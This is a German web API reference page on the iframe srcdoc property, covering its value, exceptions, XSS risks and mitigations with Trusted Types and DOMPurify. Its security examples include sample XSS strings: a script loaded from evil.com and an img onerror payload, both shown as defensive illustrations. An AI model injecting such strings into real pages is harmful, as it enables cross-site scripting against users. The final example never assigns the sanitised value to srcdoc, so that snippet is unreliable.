---
title: "HTMLIFrameElement: `srcdoc`-Eigenschaft"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
l10n:
  sourceCommit: 65cbd4ff030e6763d6868917137d728c3ec29288
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Diese Eigenschaft analysiert ihren Eingabewert als HTML und schreibt das Ergebnis in das DOM des Rahmens.
> Solche APIs sind bekannt als [Einspeisepunkte für Injektionen](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) und können potenziell ein Vektor für [Cross-Site-Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe sein, wenn die Eingabe ursprünglich von einem Angreifer stammt.
>
> Sie können dieses Risiko mindern, indem Sie immer `TrustedHTML`-Objekte anstelle von Zeichenfolgen zuweisen und [vertrauenswürdige Typen erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> Siehe [Sicherheitsüberlegungen](#sicherheitsüberlegungen) für weitere Informationen.

Die **`srcdoc`**-Eigenschaft der Schnittstelle [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement) ruft das Inline-HTML-Markup des Dokuments des Rahmens ab oder legt es fest.

Dies spiegelt das Attribut [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc) des {{htmlelement("iframe")}} wider.

## Wert

Das Abrufen der Eigenschaft gibt eine Zeichenfolge zurück, die die HTML-Serialisierung des Dokuments des Rahmens enthält.
Dies ist `undefined`, wenn der Wert nicht gesetzt ist.

Das Setzen der Eigenschaft akzeptiert entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder eine Zeichenfolge.
Es analysiert diese Eingabe als ein HTML-Dokument und ersetzt den Inhalt des Rahmens durch das Ergebnis.

### Ausnahmen

- `TypeError`
  - : Wird ausgelöst, wenn die Eigenschaft auf eine Zeichenfolge gesetzt wird, wenn [vertrauenswürdige Typen](/de/docs/Web/API/Trusted_Types_API) durch eine CSP [erzwungen sind](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) und keine Standardrichtlinie definiert ist.

## Beschreibung

Die **`srcdoc`**-Eigenschaft spiegelt den Inhalt des `\<iframe>`-Elements [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attributs wider und kann verwendet werden, um das HTML-Dokument zu setzen oder zu erhalten, das zum {{htmlelement("iframe")}} gehört.

Bei der Einstellung der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument definieren, einschließlich der {{Glossary("doctype", "Dokumenttyp-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und anderen Tags.
Beachten Sie jedoch, dass Browser in der Regel tolerant gegenüber ungültigem Markup sind und die meisten versuchen sollten, Eingaben zu rendern, die nur Körperinhalte enthalten.

Jedes vom Browser unterstützte Markup wird analysiert/serialisiert, einschließlich {{Glossary("shadow_tree", "Shadow roots")}}.

Beachten Sie, dass, wenn dies gesetzt ist, es jeden in der [`src`](/de/docs/Web/API/HTMLIFrameElement/src) Eigenschaft gesetzten Wert überschreiben wird.

### Sicherheitsüberlegungen

Die `srcdoc`-Eigenschaft ermöglicht es, dass standardmäßig absolut jedes HTML-Markup in einem Rahmen ausgeführt wird.
Wenn der Rahmen nicht mit der Content Security Policy (CSP) [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) gesichert ist (oder gesichert, aber den Wert [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) enthält), dann wird er gleich-origin mit dem übergeordneten Element sein.
Das bedeutet, dass der Rahmen vollständigen Zugriff auf das DOM und die Ressourcen des übergeordneten Elements haben wird und umgekehrt.

Dies ist ein signifikanter Vektor für [Cross-Site-Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe, wenn potenziell unsichere Zeichenfolgen, die von einem Benutzer bereitgestellt werden, ohne vorherige Sanitärmaßnahmen in einen Rahmen injiziert werden.
Betrachten Sie den folgenden Code, in dem ein HTML-String von einem Benutzer in einen Rahmen übergeben werden könnte, der dann dem Dokument hinzugefügt wird.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Wenn nicht erwartet wird, dass der Rahmen Zugriff auf Ihr übergeordnetes Dokument benötigt, können Sie das Risiko mindern, indem Sie einen CSP-Sandbox ohne den Wert `allow-same-origin` verwenden.
Der Rahmen wird dann als cross-origin Ressourcen behandelt, und Angriffe werden erheblich eingeschränkt.
Sie können auch eine allgemeinere CSP verwenden, um die Orte einzuschränken, von denen Skripte und andere Ressourcen abgerufen werden dürfen.

Sie können das Risiko weiter verringern, indem Sie immer [`TrustedHTML`](/de/docs/Web/API/TrustedHTML) Objekte anstelle von Zeichenfolgen zuweisen und [vertrauenswürdige Typen durchsetzen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) mithilfe der CSP-Direktive [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for).
Dies stellt sicher, dass die Eingabe durch eine Transformationsfunktion geleitet wird, die die Möglichkeit bietet, die Eingabe zu [bereinigen](/de/docs/Web/Security/Attacks/XSS#sanitization), um potenziell gefährliches Markup zu entfernen, bevor es injiziert wird.

## Beispiele

### Das HTML aus einem Iframe lesen

Das Lesen von `srcdoc` veranlasst den Benutzeragenten, das Dokument des Iframes zu serialisieren.

Angenommen, das folgende HTML:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
```

Sie können dann das Markup wie folgt abrufen und protokollieren:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Die Inline-Quelle des Rahmens ersetzen

In diesem Beispiel werden wir das Dokument eines Rahmens ersetzen, indem wir HTML seiner `srcdoc`-Eigenschaft zuweisen.
Um das Risiko von XSS zu mindern, erstellen wir zuerst ein `TrustedHTML`-Objekt aus der Zeichenfolge, die das HTML enthält, und weisen dann dieses Objekt `srcdoc` zu.

Vertrauenswürdige Typen werden noch nicht von allen Browsern unterstützt, daher definieren wir zuerst den [trusted types tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
Dies funktioniert als transparenter Ersatz für die Trusted Types JavaScript API:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Als nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die eine [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML) für das Transformieren einer Eingabezeichenfolge in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen definiert.
In der Regel verwenden Implementierungen von `createHTML()` eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify), um die Eingabe zu bereinigen, wie unten gezeigt:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Dann verwenden wir dieses `policy`-Objekt, um ein `TrustedHTML`-Objekt aus der möglicherweise unsicheren Eingabezeichenfolge zu erstellen und das Ergebnis dem Element zuzuweisen:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Während Sie eine Zeichenfolge direkt `srcdoc` zuweisen können, stellt dies ein [Sicherheitsrisiko](#sicherheitsüberlegungen) dar, wenn die einzufügende Zeichenfolge potenziell bösartige Inhalte enthalten könnte.
> Sie sollten `TrustedHTML` verwenden, um sicherzustellen, dass der Inhalt bereinigt wird, bevor er eingefügt wird, und Sie sollten einen CSP-Header setzen, um [vertrauenswürdige Typen durchzusetzen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}
